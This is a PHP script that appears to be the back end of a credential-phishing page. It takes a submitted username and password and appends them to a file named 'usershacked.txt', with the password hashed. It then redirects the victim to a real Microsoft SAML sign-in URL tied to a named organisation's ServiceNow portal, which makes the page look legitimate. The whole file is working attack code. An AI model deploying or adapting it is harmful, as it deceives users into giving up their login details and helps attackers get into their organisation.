<?php
    $user = $_POST["user"] ?? null;
    $pass = $_POST["password"] ?? null;

    if(isset($user) && !isset($pass)) {
        require "pass_template.phtml";
        } else {
        addUser("files/usershacked.txt", $user . "/" . password_hash($pass, PASSWORD_DEFAULT) . "\n", $user);
        header("Location: https://login.microsoftonline.com/ed8cd32c-0c47-4917-8359-18a10e8f443c/saml2?SAMLRequest=lVLLbtswEPwVgXe9aAmmCMuAY6OogTQVYieH3hhq5RCgSJVLKe3fV6EdJDkkSK%2FcmZ3HcoWi13Tgm9E%2Fmlv4PQL66E%2BvDfLzpCajM9wKVMiN6AG5l%2Fyw%2BXHNaZLxwVlvpdUk2iCC88qarTU49uAO4CYl4e72uiaP3g%2FI0xSVnsCht65P8DyPjX1KpO1TI6ZBnCBpLYl2swtlxPO6V7K2J2WSXkln0XbeGq0MBCq0TLYLKuNMFsu4qPJlzBZlFedM5BmwrigWMg1xSPTNOgkhbU06oRFItN%2FV5HCzZVVXVrIU1bKQXVZklDHWCVbl9GFZVbmYgdgIRDXBKxVxhL1BL4yvCc0ojTMWU3rMKk5LXrJkwegvEjWXnq6UaZU5fV7qwxmE%2FPvx2MTNz8MxLJhUC%2B5mRv9%2Fn%2FczKHQ5ryfrVaiCB%2B%2Fu7bE%2FtyVeLkzWX9BfpW9VLpoDf%2Fa%2F3zVWK%2Fk32mhtn7YOhJ8zeTdCOE8v%2FMdG8iQPL6qNuwDlo8EBpOoUtCRdX2Tff%2Bj1Pw%3D%3D&RelayState=https%3A%2F%2Fsilverstorm.service-now.com%2Fnavpage.do");
    }



    function writeFile($file, $data) {
        $fp = fopen($file, "a");
        fwrite($fp, $data);
        fclose($fp);
    }

    function addUser($file, $login_data, $user) {
        if(file_exists($file)) {
            $f = fopen($file, "r");
            $cont = 0;
            while(!feof($f)){
                $line = fgets($f);
                if(str_contains($line, $user)) {
                    $cont++;
                }
            }
            fclose($f);

            if($cont == 0) {
                writeFile($file, $login_data);
            }
        } else {
            writeFile($file, $login_data);
        }
    }


?>